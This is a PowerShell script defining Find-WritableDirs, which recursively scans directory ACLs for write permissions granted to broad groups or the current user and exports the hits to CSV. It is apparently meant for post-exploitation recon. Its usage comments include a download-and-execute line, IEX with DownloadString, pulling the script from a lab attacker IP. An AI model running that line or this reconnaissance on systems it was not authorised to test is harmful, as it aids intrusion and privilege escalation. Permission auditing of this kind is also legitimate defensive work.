<#
.SYNOPSIS
    Recursively finds directories writable by a given identity via
    non-inherited ACEs.

.DESCRIPTION
    Walks BaseDir recursively and pulls the ACL for every directory found.
    GENERIC_* rights on each non-inherited ACE are mapped to their concrete
    FILE_GENERIC_* equivalents, then checked for a write-capable right
    (WriteData, CreateFiles, Modify, FullControl, etc.). A directory is
    reported if that ACE's identity matches IdentityFilter, or is granted
    directly to whichever account is running the script (by name or SID -
    see -SkipCurrentUser). Matches are printed as a table and exported to
    CSV. Self-contained in a single function with no $PSScriptRoot
    dependency, so it loads cleanly via IEX. Adapted from hinchley's
    UserWritableLocations.ps1
    (https://gist.github.com/hinchley/ade9528e5ce986e9a8131489ad852789).

.PARAMETER BaseDir
    Root directory to scan recursively. Default: C:\Windows

.PARAMETER OutFile
    Path to write CSV results. Default: .\UserWritableLocations.csv
    (resolved against the current working directory - safe under IEX,
    unlike $PSScriptRoot).

.PARAMETER IdentityFilter
    Regex tested against each ACE's IdentityReference. Default matches
    Users/Everyone-style groups. Runs independently of the current-user
    check below (SkipCurrentUser) - a directory can be reported through
    either one on its own. Pass a service account name to target it
    specifically, or ".*" to match every non-inherited write ACE
    regardless of identity.

.PARAMETER SkipCurrentUser
    Also reports write ACEs granted directly to the account running the
    script, even if IdentityFilter doesn't match it (checks both the
    account name and its SID, so it still works if Windows can't resolve
    a friendly name for it). On by default; pass this switch to disable
    it and go by IdentityFilter alone.

.EXAMPLE
    # Load script from remote source via http
    IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Find-WritableDirs.ps1')

    # basic use, set C:\ as root directory (C:\Windows is default)
    Find-WritableDirs -BaseDir C:\ 

    # Custom identity filter
    Find-WritableDirs -BaseDir C:\ -IdentityFilter "LOCAL SERVICE"

    # Output results to specific file (default is set to ".\UserWritableLocations.csv)
    Find-WritableDirs -BaseDir C:\xampp -OutFile C:\Windows\Tasks\wd.csv
#>

function Find-WritableDirs {
    [CmdletBinding()]
    param(
        [string]$BaseDir = "C:\Windows",
        [string]$OutFile = ".\UserWritableLocations.csv",
        [string]$IdentityFilter = ".*USERS|EVERYONE",
        [switch]$SkipCurrentUser
    )

    $FSR = [System.Security.AccessControl.FileSystemRights]

    $GenericRights = @{
        GENERIC_READ    = [int]0x80000000
        GENERIC_WRITE   = [int]0x40000000
        GENERIC_EXECUTE = [int]0x20000000
        GENERIC_ALL     = [int]0x10000000
        FILTER_GENERIC  = [int]0x0FFFFFFF
    }

    $MappedGenericRights = @{
        FILE_GENERIC_READ    = $FSR::ReadAttributes -bor $FSR::ReadData -bor $FSR::ReadExtendedAttributes -bor $FSR::ReadPermissions -bor $FSR::Synchronize
        FILE_GENERIC_WRITE   = $FSR::AppendData -bor $FSR::WriteAttributes -bor $FSR::WriteData -bor $FSR::WriteExtendedAttributes -bor $FSR::ReadPermissions -bor $FSR::Synchronize
        FILE_GENERIC_EXECUTE = $FSR::ExecuteFile -bor $FSR::ReadPermissions -bor $FSR::ReadAttributes -bor $FSR::Synchronize
        FILE_GENERIC_ALL     = $FSR::FullControl
    }

    # Nested on purpose: keeps this helper out of the caller's global scope.
    function Convert-GenericRights([System.Security.AccessControl.FileSystemRights]$Rights) {
        $Mapped = 0
        if ($Rights -band $GenericRights.GENERIC_EXECUTE) { $Mapped = $Mapped -bor $MappedGenericRights.FILE_GENERIC_EXECUTE }
        if ($Rights -band $GenericRights.GENERIC_READ)    { $Mapped = $Mapped -bor $MappedGenericRights.FILE_GENERIC_READ }
        if ($Rights -band $GenericRights.GENERIC_WRITE)   { $Mapped = $Mapped -bor $MappedGenericRights.FILE_GENERIC_WRITE }
        if ($Rights -band $GenericRights.GENERIC_ALL)     { $Mapped = $Mapped -bor $MappedGenericRights.FILE_GENERIC_ALL }
        return (($Rights -band $GenericRights.FILTER_GENERIC) -bor $Mapped) -as $FSR
    }

    $WriteRights = @('WriteData','CreateFiles','CreateDirectories','WriteExtendedAttributes','WriteAttributes','Write','Modify','FullControl')

    # Resolve who's running this - matched by name and SID, since Get-Acl
    # sometimes only returns a SID (orphaned or unresolvable account).
    $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $currentUserName = $currentIdentity.Name
    $currentUserSid  = $currentIdentity.User.Value

    Write-Host "[*] PowerShell $($PSVersionTable.PSVersion.ToString())"
    Write-Host "[*] Running as: $currentUserName ($currentUserSid)"
    Write-Host "[*] Scanning $BaseDir (recursive ACL walk - can take a while on large trees)..."

    $rawResults = Get-ChildItem -Path $BaseDir -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object { $_.PSIsContainer } |
        ForEach-Object {
            $dir = $_.FullName
            $aces = $null
            try {
                $aces = (Get-Acl -Path $dir -ErrorAction Stop).Access
            } catch { }

            if ($aces) {
                $aces | Where-Object {
                    if ($_.IsInherited) { return $false }
                    $idValue = $_.IdentityReference.Value
                    $matchesFilter = $idValue -match $IdentityFilter
                    $matchesMe = (-not $SkipCurrentUser) -and (($idValue -eq $currentUserName) -or ($idValue -eq $currentUserSid))
                    $matchesFilter -or $matchesMe
                } | ForEach-Object {
                    $tokens = (Convert-GenericRights $_.FileSystemRights).ToString().Split(",") | ForEach-Object { $_.Trim() }
                    $hasWrite = $false
                    foreach ($t in $tokens) { if ($WriteRights -contains $t) { $hasWrite = $true; break } }
                    if ($hasWrite) {
                        $idValue = $_.IdentityReference.Value
                        $isMe = (-not $SkipCurrentUser) -and (($idValue -eq $currentUserName) -or ($idValue -eq $currentUserSid))
                        $matchedBy = if ($isMe) { "CurrentUser" } else { "IdentityFilter" }
                        New-Object PSObject -Property @{
                            Directory = $dir
                            Identity  = $idValue
                            Rights    = ($tokens -join ",")
                            MatchedBy = $matchedBy
                        } | Select-Object Directory, Identity, Rights, MatchedBy
                    }
                }
            }
        }

    $results = @($rawResults) | Sort-Object Directory, Identity -Unique
    $results | Format-Table -AutoSize
    $results | Export-Csv -Path $OutFile -NoTypeInformation -Force
    Write-Host "[*] $($results.Count) hit(s) written to $OutFile"
}
